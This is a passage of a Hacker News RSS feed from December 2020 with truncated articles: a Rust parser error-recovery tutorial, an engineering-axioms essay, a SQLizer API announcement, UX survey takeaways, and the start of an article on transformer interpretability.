</span><span>        </span><span>let</span><span> </span><span>op</span><span> </span><span>=</span><span> </span><span>match</span><span> </span><span>p</span><span>.</span><span>peek</span><span>()</span><span> </span><span>{</span><span>
</span><span>            </span><span>// snip
</span><span></span><span>            </span><span>_</span><span> </span><span>=&gt;</span><span> </span><span>break</span><span>,</span><span> </span><span>// weâ€™ll handle errors later.
</span><span></span><span>        </span><span>};</span><span>
</span><span>
</span><span>        </span><span>// snip
</span><span></span><span>    </span><span>}</span><span>
</span><span>
</span><span>    </span><span>Some</span><span>(</span><span>lhs</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><pre><code data-lang="-">$ cargo t -q --lib

running 18 tests
..................
test result: ok. 18 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out


running 18 tests
..................
test result: ok. 18 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
</code></pre><p>Letâ€™s say the parser is being used as part of a language server, and the user has typed out a variable definition:</p><pre><code>let b = a
</code></pre><p>They realise they havenâ€™t defined <code>a</code>, so they define it above:</p><pre><code>let a = 10
let b = a
</code></pre><p>While the user is in the middle of typing that, our parser sees this:</p><pre><code>let a =
let b = a
</code></pre><p>What we want is for our parser to recognise two variable definitions, with the first missing an expression. This way, language intelligence like Go To Definition can continue working in spite of an incomplete file; if we tell the editor to â€˜go to the definition of <code>a</code>â€™, it will know where to go because itâ€™s recognised two separate variable definitions. The parser would also report an error on the second <code>let</code> keyword along the lines of</p><pre><code>expected number, identifier, â€˜-â€™ or â€˜(â€™, but found â€˜letâ€™
</code></pre><p>Our goal for the rest of this part is to make Eldiro have this behaviour.</p><p>This is the simplest of all the error recovery techniques; if you expect to see a <code>Foo</code>, but see something else, you skip tokens until you find a <code>Foo</code>. This is simple to implement but doesnâ€™t deliver the best output, since it throws away a lot of possibly-useful tokens. For example, all the underlined tokens here are thrown away:</p><pre><code data-lang="-">let a =
let b = a
-------
</code></pre><p>Here the IDEâ€™s Go To Definition on <code>a</code> wouldnâ€™t work, and the user would get an â€˜undefined variable <code>a</code>â€™ error. Evidently, this error recovery strategy doesnâ€™t let us achieve the ideal case we laid out before.</p><p>The idea is to start with the above approach, but <em>donâ€™t skip certain tokens.</em> For example, letâ€™s say we have the following code:</p><pre><code>{
  let a = {
    let bar =
  }
  10
}
</code></pre><p>The naive approach would start looking for an expression after the <code>let bar =</code>, and would stop throwing away tokens at <code>10</code>. It now consumes the final <code>}</code> to close the <code>let a = {</code> block. This doesnâ€™t leave a <code>}</code> to close the surrounding block, though, which means the user gets an â€˜unclosed <code>{</code>â€™ error. Hereâ€™s roughly what the parser sees if you donâ€™t include errors and fix the indentation:</p><pre><code>{
  let a = {
    let bar = 10
  }
</code></pre><p>With the fancier approach, we can tell the parser not to skip <code>}</code> tokens, since those are important for recognising program structure. In languages with explicit statement terminators, parsers are often constructed so that <code>;</code> is never skipped. These tokens that arenâ€™t to be skipped by the parser during error recovery are called â€˜recovery setsâ€™.</p><p>We can improve on this approach by only ever skipping one token, which means we throw away even less of the input.</p><p>Remember that ideal example from earlier?</p><pre><code>let a =
let b = a
</code></pre><p>We can achieve the goal of recognising two variable declarations by including <code>let</code> in the parserâ€™s recovery set. This way, whenever the parser encounters an unexpected <code>let</code>, it will stop parsing what itâ€™s up to and keep returning from subparsers until it gets to a state in which <code>let</code> can be recognised.</p><p>Letâ€™s write a test for the case we just discussed:</p><div><pre><code data-lang="rust"><span>// stmt.rs
</span><span></span><span>
</span><span></span><span>#[cfg(test)]</span><span>
</span><span></span><span>mod</span> <span>tests</span><span> </span><span>{</span><span>
</span><span>    </span><span>// snip
</span><span></span><span>
</span><span>    </span><span>#[test]</span><span>
</span><span>    </span><span>fn</span> <span>recover_on_let_token</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>check</span><span>(</span><span>
</span><span>            </span><span>"let a =\nlet b = a"</span><span>,</span><span>
</span><span>            </span><span>expect</span><span>!</span><span>[[</span><span>r#"
</span><span>Root@0..17
</span><span>  VariableDef@0..8
</span><span>    LetKw@0..3 "let"
</span><span>    Whitespace@3..4 " "
</span><span>    Ident@4..5 "a"
</span><span>    Whitespace@5..6 " "
</span><span>    Equals@6..7 "="
</span><span>    Whitespace@7..8 "\n"
</span><span>  VariableDef@8..17
</span><span>    LetKw@8..11 "let"
</span><span>    Whitespace@11..12 " "
</span><span>    Ident@12..13 "b"
</span><span>    Whitespace@13..14 " "
</span><span>    Equals@14..15 "="
</span><span>    Whitespace@15..16 " "
</span><span>    VariableRef@16..17
</span><span>      Ident@16..17 "a""#</span><span>]],</span><span>
</span><span>        </span><span>);</span><span>
</span><span>    </span><span>}</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Letâ€™s write an <code>expect</code> method on <code>Parser</code> that takes a given <code>SyntaxKind</code> and <code>bump</code>s past it if the parser is up to it; if it isnâ€™t, then we might skip the token depending on whether itâ€™s part of the recovery set:</p><div><pre><code data-lang="rust"><span>// parser.rs
</span><span></span><span>
</span><span></span><span>const</span><span> </span><span>RECOVERY_SET</span>: <span>[</span><span>SyntaxKind</span><span>;</span><span> </span><span>1</span><span>]</span><span> </span><span>=</span><span> </span><span>[</span><span>SyntaxKind</span>::<span>LetKw</span><span>];</span><span>
</span><span>
</span><span></span><span>// snip
</span><span></span><span>
</span><span></span><span>impl</span><span>&lt;</span><span>'t</span><span>,</span><span> </span><span>'input</span><span>&gt;</span><span> </span><span>Parser</span><span>&lt;</span><span>'t</span><span>,</span><span> </span><span>'input</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>// snip
</span><span></span><span>
</span><span>    </span><span>pub</span><span>(</span><span>crate</span><span>)</span><span> </span><span>fn</span> <span>expect</span><span>(</span><span>&amp;</span><span>mut</span><span> </span><span>self</span><span>,</span><span> </span><span>kind</span>: <span>SyntaxKind</span><span>)</span><span> </span><span>{</span><span>
</span><span>        </span><span>if</span><span> </span><span>self</span><span>.</span><span>at</span><span>(</span><span>kind</span><span>)</span><span> </span><span>||</span><span> </span><span>!</span><span>self</span><span>.</span><span>peek</span><span>().</span><span>map_or</span><span>(</span><span>false</span><span>,</span><span> </span><span>|</span><span>k</span><span>|</span><span> </span><span>RECOVERY_SET</span><span>.</span><span>contains</span><span>(</span><span>&amp;</span><span>k</span><span>))</span><span> </span><span>{</span><span>
</span><span>            </span><span>self</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>        </span><span>}</span><span>
</span><span>    </span><span>}</span><span>
</span><span>
</span><span>    </span><span>// snip
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Letâ€™s use this method in <code>variable_def</code>:</p><div><pre><code data-lang="rust"><span>// stmt.rs
</span><span></span><span>
</span><span></span><span>fn</span> <span>variable_def</span><span>(</span><span>p</span>: <span>&amp;</span><span>mut</span><span> </span><span>Parser</span><span>)</span><span> </span>-&gt; <span>CompletedMarker</span><span> </span><span>{</span><span>
</span><span>    </span><span>assert</span><span>!</span><span>(</span><span>p</span><span>.</span><span>at</span><span>(</span><span>SyntaxKind</span>::<span>LetKw</span><span>));</span><span>
</span><span>    </span><span>let</span><span> </span><span>m</span><span> </span><span>=</span><span> </span><span>p</span><span>.</span><span>start</span><span>();</span><span>
</span><span>    </span><span>p</span><span>.</span><span>bump</span><span>();</span><span>
</span><span>
</span><span>    </span><span>p</span><span>.</span><span>expect</span><span>(</span><span>SyntaxKind</span>::<span>Ident</span><span>);</span><span>
</span><span>    </span><span>p</span><span>.</span><span>expect</span><span>(</span><span>SyntaxKind</span>::<span>Equals</span><span>);</span><span>
</span><span>
</span><span>    </span><span>expr</span>::<span>expr</span><span>(</span><span>p</span><span>).</span><span>unwrap</span><span>();</span><span>
</span><span>
</span><span>    </span><span>m</span><span>.</span><span>complete</span><span>(</span><span>p</span><span>,</span><span> </span><span>SyntaxKind</span>::<span>VariableDef</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Althoughâ€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arzg.github.io/lang/18/">https://arzg.github.io/lang/18/</a></em></p>]]>
            </description>
            <link>https://arzg.github.io/lang/18/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494909</guid>
            <pubDate>Mon, 21 Dec 2020 13:52:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Engineering Axioms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494784">thread link</a>) | @martinrue
<br/>
December 21, 2020 | https://martinrue.com/my-engineering-axioms/ | <a href="https://web.archive.org/web/*/https://martinrue.com/my-engineering-axioms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            <h3>My Engineering Axioms</h3>

            <p>A few months back I gave a talk in which I shared a list of my personal engineering axioms â€“ things that, over the years, I've come to think of as generally true and useful to have in mind when writing code, building things, and working with others.</p>

            <p>Axiom is a fancy word, but popping a few layers off the etymology stack we arrive neatly at the ancient Greek word <a href="https://en.wiktionary.org/wiki/%E1%BC%80%CE%BE%CE%AF%CF%89%CE%BC%CE%B1">á¼€Î¾Î¯Ï‰Î¼Î±</a>, or "that which is thought fit or worthy". I like that, and consider each item on the list at least worthy of consideration.</p>

            <p>Of course they're <b>my</b> engineering axioms â€“ things I believe to be useful based on my own experience. Your experience may well differ. Maybe you already knew about <a href="https://martinrue.com/zzuy-a-lesson-in-perseverance/">zero termination</a>, or have better tools than <a href="https://martinrue.com/give-yourself-more-playtime/">scissors to remove bugs</a> from your programs.</p>

            <p>In any case, I thought it would be fun to share the list here, with a few brief clarifications. Some things are pretty unsurprising, but hopefully others will generate some provocative thoughts and/or interesting disagreements.</p>

            <h4>1. Change is constant.</h4>

            <p>This one shouldn't be too controversial. Almost everything is always changing, including the rate of change itself. We need to acknowledge not only that our ability to respond to change is crucial, but that how well we do it (time, cost, quality, reliability) is often a dimension of our competitiveness.</p>

            <h4>2. Your product is an asset, but code is a liability.</h4>

            <p>Your product solves your customer's problem(s), and therefore is your asset. The code itself is the cost of creating the asset. The more code you have, the more it needs to be read, tested, changed, and understood. This is especially relevant when you consider axiom 1. Accept new code (and dependency on external code) conservatively. The best code is code you don't have to write.</p>

            <h4>3. Duplication is less costly than premature abstraction.</h4>

            <p>Until you have a high degree of confidence that your abstraction is going to pay for itself because it solves a real, abstract problem you really do have, don't do it. Wait and learn more. Until then, repeating code can help avoid dependency, which itself makes the code easier to change independently or delete. A premature abstraction creates complexity through dependency and indirection, and can become a bottleneck to your ability to respond to change.</p>

            <h4>4. Code should be easy to delete.</h4>

            <p>Write code to be removable, which in large part is the same as saying "decoupled". For sure not all code needs to be similarly removable, but minimising dependencies, having clear boundaries via well-defined interfaces, and having a thoughtful overall system design allows parts to be removed/changed more easily. I once heard someone use the expression "code spent", as an alternative to "code written" and I love that. I like the implication that removing code is reducing future cost.</p>

            <h4>5. Existing code exerts a powerful influence.</h4>

            <p>The very fact it's there suggests it's correct and necessary. Hopefully it is, but not always. We need to maintain both the confidence to change it, and the ability to reason about whether we should. Don't let the existence of code itself create doubt that it can't be removed. As per axiom 4, it should be easy to remove, and the system design should be good enough to enable us to understand whether we still need it.</p>

            <h4>6. Accidental complexity is one of the biggest risks.</h4>

            <p>Accidental complexity is complexity that can be avoided, and occurs due to things like poor design, bad decisions, and not prioritising an appropriate level of simplicity within a system. If simplicity is not a goal, accidental complexity is more likely to occur as a system grows, and will gradually negatively affect almost everything from changing the system to even being able to understand it. The 2006 paper <a href="http://curtclifton.net/papers/MoseleyMarks06a.pdf">Out of the Tar Pit</a> is a worthwhile read on this subject.</p>

            <h4>7. Technical excellence can be shadowed by bad personal skills.</h4>

            <p>Unless you're working completely alone, it's not just your ability to solve technical problems, to write good code, etc, that matters. To the contrary, they matter even less if you make the people around you unhappy and less productive. Just like learning to write good code, you have to learn "to people" good as well. Empathy is a big part of this, as is recognising that people are different â€“ be caring, be understanding, help others and ask for help yourself, be nice. Be an engineer others want to work with.</p>

            <h4>8. You are not your code. Be kind to the coder, not to the code.</h4>

            <p>Code is merely a moment in time that captured what we thought we knew about something. It's not you. You may have wrote it, but since that moment (even if it was 3 minutes ago) you've grown, but the code has not. A conversation about code, good or bad, should never be personal. Keep it professional. Talk about the code, or about the problem, but don't make it about the person who wrote it. Use "we" instead of "you". Sometimes I try to pretend I wrote the code someone else wrote, which helps me avoid accidentally sounding personal.</p>

            <h4>9. Treat people who know less than you with respect and patience.</h4>

            <p>We all start somewhere, and the journey is a lot more joyful when you're surrounded by patient people who want you to succeed, rather than those who make you feel like you don't belong. If you struggle with this, it may be helpful to remember that the newbie programmer almost certainly does something better than you do â€“ perhaps they're fluent in another language, or cook amazingly, or play a sport. Just imagine yourself in the reverse role. How would you like them to treat you, the total newbie? Again: be an engineer others want to work with.</p>

            <h4>10. The only true authority stems from knowledge, not from position.</h4>

            <p>Knowledge and understanding of the problem, the domain, the customer, are all far more important than whatever the first 3 letters on your business card are. <a href="https://youtu.be/cISYzA36-ZY?t=85">Even if it does have a watermark</a>. Understand how something works from first principles, build a solid understanding, and authority will follow.</p>

            <h4>11. Teaching is a form of learning in disguise.</h4>

            <p>If you think you know something, try teaching it. Often the very act of trying to explain what you know to someone else forces you to formalise your own thoughts much more clearly. Writing things down seems to have a similar effect. I've lost count of the number of times I've begun explaining something only to find I don't quite understand it as well as I thought.</p>

            <h4>12. Lift the skills of people around you, not just yourself.</h4>

            <p>A great team is never a great because of one amazing person. It's a great team because everyone challenges each other and everybody grows together. When you learn something cool, share it â€“ help the people around you get better. As they do the same, everybody benefits and nobody gets left behind. It's also far more fun. Secondary benefit: axiom 11.</p>

            <h4>13. The longer you wait the more you'll know.</h4>

            <p>I'm still learning this and trying hard to avoid my almost default desire to decide quickly. The truth is, the longer you delay non-essential decisions the more information you'll have to lean on when the time comes to make it. Of course you can't always procrastinate a decision, but often you can, and as a minimum you should at least consider whether not knowing the answer right now is actually OK.</p>

            <h4>14. A good type system is worth its weight plus some.</h4>

            <p>Having gone backwards and forwards through various static and dynamic languages over my career, I'm currently of the opinion that a good type system is worth its overhead. A good type system shouldn't carry all that much overhead. If the type system is designed well, it can almost feel like a dynamic language (via features like inference and flow analysis) while removing a whole class of issues that the compiler can handle far better and quicker than you can. Developments like ownership in Rust are a nice example of how this has gone even further than people would have imagined years back.</p>

            <h4>15. The right team of people trumps everything else.</h4>

            <p>Having a team of people who just want to work together and build great things makes a lot of other problems easier to deal with. The word "right" here is highly subjective and contextual, but at least anecdotally, empathy, respect, and friendship have been recurring elements of great teams I've been part of.</p>

            <h4>16. Stick to boring technology, unless there's a good reason not to.</h4>

            <p>Boring tech is often older and better understood. There's battle-hardened experience of how to use it effectively, better understanding of its failure modes, and it's easier to find people and resources on how to best apply it. I really like Dan McKinley's idea of <a href="https://mcfunley.com/choose-boring-technology">innovation tokens</a>. You only get 3. Use them to adopt or build brand new stuff â€“ ideally stuff that will make you better at your core competency â€“ but any more than 3 and the risk of never reaching stability/maturity starts to grow.</p>

            <h4>17. Have the smallest team possible, but no smaller. Grow it carefully.</h4>

            <p>A play on a well-known quote, and your mileage may vary on this one. In my career so far, I've reliably seen smaller teams be more effective than larger ones. There's a balance to be found, for sure, which depends on the magnitude and complexity of the problem you're solving. That said, smaller teams benefit from less communication overhead, less room for miscommunication, and more space for everyone's voice to be heard. In a smaller team, it also feels more personal, and I feel more responsible, and I like that.</p>

            <h4>18. Rest.</h4>

            <p>I'm happy to see the gradual de-sexification of â€¦</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://martinrue.com/my-engineering-axioms/">https://martinrue.com/my-engineering-axioms/</a></em></p>]]>
            </description>
            <link>https://martinrue.com/my-engineering-axioms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494784</guid>
            <pubDate>Mon, 21 Dec 2020 13:38:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Entire Linux Source Code Development History Visualized]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25494737">thread link</a>) | @pro_metheu5
<br/>
December 21, 2020 | https://www.visualsource.net/repo/github.com/torvalds/linux.git | <a href="https://web.archive.org/web/*/https://www.visualsource.net/repo/github.com/torvalds/linux.git">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.visualsource.net/repo/github.com/torvalds/linux.git</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494737</guid>
            <pubDate>Mon, 21 Dec 2020 13:33:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GraphQL vs. REST. Which to Choose? Tough Decision. Pros and Cons of Using Each]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494698">thread link</a>) | @relu_mesaros
<br/>
December 21, 2020 | https://flawless-bits.com/blog/rest-vs-graphql | <a href="https://web.archive.org/web/*/https://flawless-bits.com/blog/rest-vs-graphql">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://flawless-bits.com/blog/rest-vs-graphql</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494698</guid>
            <pubDate>Mon, 21 Dec 2020 13:28:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The SQLizer file conversion API is now available on the free plan]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494533">thread link</a>) | @wgx
<br/>
December 21, 2020 | https://blog.sqlizer.io/posts/sqlizer-free-file-conversion-api/?referrer=hn | <a href="https://web.archive.org/web/*/https://blog.sqlizer.io/posts/sqlizer-free-file-conversion-api/?referrer=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <h3 id="api-powered-file-conversion-to-mysql-postgresql-and-ms-sql-server-all-for-0">API-powered file conversion to MySQL, PostgreSQL, and MS SQL Server, all for $0.</h3>

<p>Weâ€™re excited to announce that from today, customers on the <strong>SQLizer free plan</strong> will have access to the <a href="https://sqlizer.io/help/api/">SQLizer API</a>.</p>

<p>Previously only available on our paid plans, the SQLizer API allows programmatic access to our file conversion engine, with its intelligent format detection algorithms.</p>

<p>SQLizer converts â€˜flatâ€™ data files (like CSV, Excel, or JSON) into database insert statements in SQL, ready to run, importing data into your preferred database.</p>

<h3 id="intelligent-format-detection">Intelligent format detection</h3>

<p>Database columns need to know which type of data they hold - but many data files donâ€™t state which type of data they contain. This makes importing data difficult because you need to work out which columns are in which formats. 
SQLizer works this out intelligently, and automatically.</p>

<h2 id="to-get-started-with-the-sqlizer-api">To get started with the SQLizer API</h2>

<ol>
  <li>Visit <a href="https://sqlizer.io/signup/">SQLizer Signup</a> and create a new account, you can select the <strong>free plan to process fewer than 5,000 rows of data</strong></li>
  <li>Visit <a href="https://sqlizer.io/account/">your SQLizer account</a> and copy your API key</li>
  <li>Visit the <a href="https://sqlizer.io/help/api/">SQLizer API documentation</a> for instructions on making your first request to the API</li>
</ol>

<p>We hope you enjoy working with the SQLizer API.</p>

<p><strong>.NET framework fans!</strong> If you work with .NET, then check out the <a href="https://github.com/sqlizer-io/sqlizer-client-dotnet">SQLizer .NET Client</a> on Github.</p>

<p>See also: <a href="https://www.nuget.org/packages/sqlizer-client-dotnet/">The NuGet package page for the SQLizer .NET Client</a>.</p>

<p>ğŸ–¤ The SQLizer Team</p>

  </div></div>]]>
            </description>
            <link>https://blog.sqlizer.io/posts/sqlizer-free-file-conversion-api/?referrer=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494533</guid>
            <pubDate>Mon, 21 Dec 2020 13:03:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Takeaways from the 2020 UX Tools Survey]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494382">thread link</a>) | @jrdnbwmn
<br/>
December 21, 2020 | https://learnuxd.io/posts/7-takeaways-from-2020-ux-tools-survey | <a href="https://web.archive.org/web/*/https://learnuxd.io/posts/7-takeaways-from-2020-ux-tools-survey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/cover.svg" alt="7 Takeaways from the 2020 UX Tools Survey">
    <figcaption>From <a href="https://uxtools.co/" target="_blank" rel="noopener">uxtools.co</a></figcaption>
</figure>

<p>Over 4,000 designers responded to <a href="https://taylorpalmer.co/" target="_blank" rel="noopener">Taylor Palmer</a>â€™s annual <a href="https://uxtools.co/" target="_blank" rel="noopener">UX Tools</a> survey.</p>

<p>Here are some key takeaways from the results.</p>

<h2 id="1miro-had-massive-growth">1)&nbsp;&nbsp;Miro had massive growth</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/miro.svg" alt="Miro had massive growth">
</figure>

<p>In the brainstorming category, <a href="https://miro.com/" target="_blank" rel="noopener">Miro</a> grew from 5% usage in 2019 to 33% in 2020. This has become one of my personal favorite tools.</p>

<h2 id="2people-love-whimsical">2)&nbsp;&nbsp;People love Whimsical</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/whimsical.svg" alt="People love whimsical">
</figure>

<p>Most tools averaged a rating of 3.5 out of 5, but <a href="https://whimsical.com/" target="_blank" rel="noopener">Whimsical</a> achieved a great score of 4.5. Miro also had high scores, but Whimsical looks to be a great contender.</p>

<h2 id="3windows-adoption-is-climbing">3)&nbsp;&nbsp;Windows adoption is climbing</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/windows-vs-mac.svg" alt="Windows adoption is climbing">
</figure>

<p>More designers are using <a href="https://www.microsoft.com/en-us/windows" target="_blank" rel="noopener">Windows</a>. 25% of respondents used Windows as one of their platforms for design this year, up from 18% last year.</p>

<h2 id="4figma-usage-skyrocketed">4)&nbsp;&nbsp;Figma usage skyrocketed</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/figma.svg" alt="Figma usage skyrocketed">
</figure>

<p>Taylor said the <a href="https://www.figma.com/" target="_blank" rel="noopener">Figma</a> numbers were so high, Taylor had to double-check them. They were the clear winner in multiple categories, including the â€œWhich tools are you most excited to try in 2021?â€ section.</p>

<h2 id="5testers-like-zoom--maze">5)&nbsp;&nbsp;Testers like Zoom &amp; Maze</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/user-testing.svg" alt="Testers favor Zoom &amp; Maze">
</figure>

<p><a href="https://zoom.us/" target="_blank" rel="noopener">Zoom</a> is the clear winner here, especially as it becomes a household name. <a href="https://maze.design/" target="_blank" rel="noopener">Maze</a> also had a strong showing and high user rating. 25% donâ€™t use software at all.</p>

<h2 id="6notion-is-a-budding-favorite">6)&nbsp;&nbsp;Notion is a budding favorite</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/notion.svg" alt="Notion is a budding favorite">
</figure>

<p>There were several surprise appearances from <a href="https://www.notion.so/" target="_blank" rel="noopener">Notion</a> in multiple categories. Itâ€™s clearly becoming a popular solution for many designers.</p>

<h2 id="7adobe-xd-is-slowly-emerging">7)&nbsp;&nbsp;Adobe XD is slowly emerging</h2>

<figure>
    <img src="https://learnuxd.io/img/posts/2020-tools-survey/adobe-xd.svg" alt="Adobe XD is slowly emerging">
</figure>

<p><a href="https://www.adobe.com/products/xd.html" target="_blank" rel="noopener">Adobe XD</a> grew 10x from being used by 1% of respondents in 2019 to 11% for managing a design system. However, itâ€™s still behind Figma and Sketch.</p>

<h2 id="wrapping-up">Wrapping up</h2>

<p>Big thanks to <a href="https://twitter.com/_taylorpalmer" target="_blank" rel="noopener">Taylor</a> for putting this together every year! Be sure to visit <a href="https://uxtools.co/survey-2020/" target="_blank" rel="noopener">uxtools.co/survey-2020</a> to see all the results.</p>

<p>Have you changed tools in 2020? Let me know on the <a href="https://twitter.com/learn_uxd/status/1340991771795484677" target="_blank" rel="noopener">Twitter thread</a>. If youâ€™re feeling generous, perhaps like or retweet the thread, too:</p>


</div></div>]]>
            </description>
            <link>https://learnuxd.io/posts/7-takeaways-from-2020-ux-tools-survey</link>
            <guid isPermaLink="false">hacker-news-small-sites-25494382</guid>
            <pubDate>Mon, 21 Dec 2020 12:42:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interfaces for Explaining Transformer Language Models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25494310">thread link</a>) | @jalammar
<br/>
December 21, 2020 | https://jalammar.github.io/explaining-transformers/ | <a href="https://web.archive.org/web/*/https://jalammar.github.io/explaining-transformers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        











<p>Interfaces for exploring transformer language models by looking at input saliency and neuron activation.</p>

<div>

<div>
<figure>
    <figcaption>
        <strong>Explorable #1:</strong>  Input saliency of a list of countries generated by a language model<br>
         <strong>Tap or hover over</strong> the <strong>output tokens</strong>:</figcaption>
    
    <br>
    <figcaption>
    <br>
        <strong>Explorable #2:</strong>  Neuron activation analysis reveals four groups of neurons, each is associated with generating a certain type of token<br>
        <strong>Tap or hover over</strong> the sparklines on the left to isolate a certain factor:</figcaption>
    
    <br>
</figure>
    </div>
</div>

<!--
<div class="toc">
    <h3>Contents</h3>
    <ul>
        <li>
            <a href="#introduction">Introduction</a>
        </li>
        <li>
            <a href="#saliency">Input Saliency</a>
        </li>
        <li>
            <a href="#evolution">Evolution of Hidden States</a>
        </li>
        <li>
            <a href="#activations">Neuron Activations</a>
        </li>
        <li>
            <a href="#conclusion">Conclusion & Future Work</a>
        </li>
    </ul>
</div>
-->

<p id="introduction">The Transformer architecture<cite key="vaswani2017attention"></cite>
    has been powering a number of the recent advances in NLP. A breakdown of this architecture is provided <a href="https://jalammar.github.io/illustrated-transformer/">here</a> <cite key="alammar2018illustrated"></cite>. Pre-trained language models based on the architecture,
    in both its auto-regressive<cite key="liu2018generating,radford2018improving,radford2019language,brown2020language"></cite> (models that use their own output as input to next time-steps and that process tokens from left-to-right, like GPT2)
    and denoising<cite key="devlin2018bert,liu2019roberta,lan2019albert,lewis2019bart,raffel2019exploring"></cite> (models trained by corrupting/masking the input and that process tokens bidirectionally, like BERT)
    variants continue to push the envelope in various tasks in NLP and, more recently, in computer vision<cite key="dosovitskiy2020image"></cite>. Our understanding of why these models work so well, however, still lags behind these developments.
</p>

<p>This exposition series continues the pursuit to interpret<cite key="rogers2020primer,atanasova2020diagnostic"></cite>
    and visualize<cite key="vig2019visualizing,madsen2019visualizing,hoover2020,tenney2020language,wallace2019allennlp"></cite>
    the inner-workings of transformer-based language models.

We illustrate how some key interpretability methods apply to transformer-based language models. This article focuses on auto-regressive models, but these methods are applicable to other architectures and tasks as well.
     
</p>

<p>This is the first article in the series. In it, we present explorables and visualizations aiding the intuition of:</p>
<ul>
    <li>
        <strong>Input Saliency</strong> methods that score input tokens importance to generating a token.
    </li>
    <li>
        <strong>Neuron Activations</strong> and how individual and groups of model neurons spike in response to
        inputs and to produce outputs.
    </li>
</ul>

<p>The next article addresses <strong>Hidden State Evolution</strong> across the layers of the model and what it may tell us about each layer's role.</p>

<!--more-->

<!--
    <li>
        <strong>Attention</strong>, a central concept in transformers, and how recent work<cite key="abnar2020quantifying"></cite>
        leads to visualizations that are more faithful to its role.
    </li>
-->

<p>In the language of Interpretable Machine Learning (IML) literature like Molnar et al.<cite key="molnar2020interpretable"></cite>, input saliency is a method that explains individual predictions. The latter two methods fall under the
    umbrella of "analyzing components of more complex models", and are better described as increasing the transparency<cite key="du2019techniques,carvalho2019machine"> </cite> of transformer models.
</p>

<p>Moreover, this article is accompanied by <a href="https://github.com/jalammar/ecco/tree/main/notebooks">reproducible notebooks</a> and <a href="https://github.com/jalammar/ecco/">Ecco - an open source library</a> to create similar
    interactive interfaces directly in Jupyter notebooks<cite key="ragan2014jupyter"></cite>
    for GPT-based<cite key="radford2018improving"></cite> models from the HuggingFace transformers library<cite key="wolf2019huggingface"></cite>.
</p>

<p>If we're to impose the three components we're examining to explore the architecture of the transformer, it would look like the following figure.</p>
<figure>
    <img src="https://jalammar.github.io/images/explaining/transformer-input-saliency-hidden-states-neuron-activations.png">
    <figcaption>
        <strong>
            Figure: Three methods to gain a little more insight into the inner-workings of Transformer language models.
        </strong> <br>
        By introducing tools that visualize input saliency, the evolution of hidden states, and neuron activations, we aim to enable researchers to build more intuition about Transformer language models.
    </figcaption>
</figure>

<hr>

<h2 id="saliency">Input Saliency</h2>

<p>When a computer vision model classifies a picture as containing a husky, saliency maps can tell us whether the classification was made due to the visual properties of the animal itself, or because of the snow in the background<cite key="ribeiro2016whyribeiro2016why"></cite>. This is a method of <i>attribution</i> explaining the relationship between a model's output and inputs -- helping us detect errors and biases, and better understand the behavior of the system.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/dog-saliency-map.jpg">
    <figcaption>
        <strong>
            Figure: Input saliency map attributing a model's prediction to input pixels.
        </strong> <br>
    </figcaption>
</figure>

<p>Multiple methods exist for assigning importance scores to the inputs of an NLP model<cite key="li2015visualizing,arrieta2020explainable"></cite>. The literature is most often concerned with this application for classification tasks, rather than natural
    language generation. This article focuses on language generation. Our first interface calculates feature importance after each token is generated, and by
    hovering or tapping on an output token, imposes a saliency map on the tokens responsible for generating it.
</p>

<p>
    The first example for this interface asks GPT2-XL<cite key="radford2019language"></cite> for William Shakespeare's date of birth. The model is correctly able to produce the date (1564, but broken into two tokens: " 15" and "64", because the model's vocabulary does not include " 1564" as a single token). The interface shows the importance of each input token when generating each output token:
</p>
<figure>

    
    
    <figcaption>
